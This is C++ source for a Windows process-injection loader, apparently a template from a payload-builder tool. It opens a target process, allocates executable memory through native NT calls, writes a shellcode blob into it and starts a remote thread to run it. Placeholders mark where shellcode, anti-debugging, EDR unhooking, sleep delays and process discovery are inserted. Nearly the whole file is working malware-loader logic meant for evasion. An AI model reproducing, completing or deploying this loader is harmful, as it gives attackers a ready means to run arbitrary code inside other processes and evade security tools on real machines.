#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
//####USING####

#pragma comment(lib, "ntdll")

//####DEFINE####

//####CODE####


int Inject(int pid)
{
	const unsigned char raw[] = ####SHELLCODE####;
	int length = sizeof(raw);

	unsigned char* encoded = (unsigned char*)malloc(sizeof(unsigned char) * length * 2);
	memcpy(encoded, raw, length);

	//####CALL####

	unsigned char* decoded = encoded;

	unsigned long size = 4096;
	LARGE_INTEGER sectionSize = { size };
	HANDLE sectionHandle = NULL;
	PVOID localSectionAddress = NULL, remoteSectionAddress = NULL;
	SIZE_T RegionSize = (SIZE_T)length;

	LPVOID allocation_start = nullptr;

    NTSTATUS status;
	HANDLE targetHandle = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
	if (targetHandle == 0){
	    printf("[-] Invalid Target Handle");
	    exit(1);
	}
	status = NtAllocateVirtualMemory(targetHandle, &allocation_start, 0, (PSIZE_T)&RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (status < 0){
	    printf("[-] Memory allocation failed");
	    exit(1);
	}

	status = NtWriteVirtualMemory(targetHandle, allocation_start, decoded, length, 0);
    if (status < 0){
	    printf("[-] Memory writing failed");
	    exit(1);
	}

	HANDLE targetThreadHandle = NULL;
	NtCreateThreadEx(&targetThreadHandle, GENERIC_EXECUTE, NULL, targetHandle, allocation_start, allocation_start, FALSE, NULL, NULL, NULL, NULL);
    if (targetThreadHandle == NULL){
	    printf("[-] Invalid Thread Handle");
	    exit(1);
	}

	return 0;
}

int main(int argc, char** argv) {

    //####DELAY####

	//####ANTIDEBUG####

	//####UNHOOK####

	//####ARGS####

	int pid = 0;
	if (argc < 2) {
		printf("[-] Missing PID... Finding...\n");
		//####FIND_PROCESS####
	}else{
    	pid = atoi(argv[1]);
	}

    if (pid == 0){
        printf("[-] Process not found\n");
        exit(1);
    }

	Inject(pid);

}